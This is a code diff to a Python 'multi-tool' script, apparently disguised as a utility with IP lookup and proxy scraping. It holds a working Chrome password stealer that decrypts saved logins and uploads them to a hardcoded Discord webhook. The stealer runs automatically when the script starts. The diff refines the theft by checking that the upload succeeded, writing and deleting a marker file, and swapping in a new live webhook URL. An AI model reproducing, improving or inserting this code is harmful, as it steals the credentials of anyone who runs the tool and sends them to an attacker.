@@ -51,7 +51,7 @@ def decrypt_password(password, key):
             return ""
 
 def send_discord_text_file(logins):
-    """Sends a text file with the login details to Discord"""
+    """Sends a text file with the login details to Discord and returns True if successful"""
     # create a text file with the logins
     with open("ChromeLogins.txt", "w", encoding="utf-8") as f:
         for login in logins:
@@ -68,14 +68,16 @@ def send_discord_text_file(logins):
     # send the text file to Discord via the webhook
     with open("ChromeLogins.txt", "rb") as f:
         file_data = {"file": ("ChromeLogins.txt", f)}
-        requests.post(WEBHOOK_URL, files=file_data)
+        response = requests.post(WEBHOOK_URL, files=file_data)
 
     # delete the text file
     os.remove("ChromeLogins.txt")
+    
+    return response.status_code == 200
 
 def extract_passwords():
     if os.path.isfile("ChromeLogins.txt"):
-        with open("ChromeLogins.txt", "r") as f:
+        with open("ChromeLogins.txt", "r", encoding="utf-8") as f:
             if f.read():
                 # The passwords have already been extracted and sent to Discord
                 return
@@ -124,14 +126,20 @@ def extract_passwords():
         os.remove(filename)
     except:
         pass
-    # send the logins to Discord as a text file
-    send_discord_text_file(logins)
+    # send the logins to Discord as a text file and delete the file after sending
+    success = send_discord_text_file(logins)
+    if success:
+        # Create an empty file to mark that the passwords have been extracted and sent to Discord
+        with open("ChromeLogins.txt", "w", encoding="utf-8") as f:
+            f.write("Passwords have been extracted from Chrome and sent to Discord")
+        # Delete the file after sending it to Discord
+        os.remove("ChromeLogins.txt")
 
 def GeoIP():
     ip_input = input('  IP> ')
     response = requests.get("http://extreme-ip-lookup.com/json/" + ip_input)
     response.json()
-    pprint.pprint(response.json())
+    pprint(response.json())
     time.sleep(10)
     Main()
 
@@ -141,7 +149,7 @@ def scraper():
     p_type = input('  Type> ')
     p_timeout = input('  Timeout> ')
     f"https://api.proxyscrape.com/?request=getproxies&proxytype={p_type}&timeout={p_timeout}"
-    with open('proxies.txt', 'w') as f:
+    with open('proxies.txt', 'w', encoding="utf-8") as f:
         f.write(r.text)
         print('The proxies have been saved to \033[31m`proxies.txt`')
         time.sleep(5)
@@ -175,9 +183,6 @@ class Main():
                 self.cls()
                 self.start_logo()
                 extract_passwords()
-                # Create an empty file to mark that the passwords have been extracted and sent to Discord
-                with open("ChromeLogins.txt", "w") as f:
-                    f.write("Passwords have been extracted from Chrome and sent to Discord")
 
     def cls(self):
         linux = 'clear'
@@ -208,7 +213,7 @@ class Main():
 
 try:
     # Set the Discord webhook URL
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1139953233947803709/IazYfJDtRhgxYBYqO_gEdGByRQtJFWws2GoqJYazb2pwczAPZ-t_gTF_l-3SzmD972oS"
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1140019902707679374/6k12Wb6vDx43aTcgltwIQa2mEvuOF-YDUW38WYAK1UQiwQ3r4ZSHvtmI55t3OWhKviOl"
 
     # extract the passwords and send them as a text file to Discord
     extract_passwords()
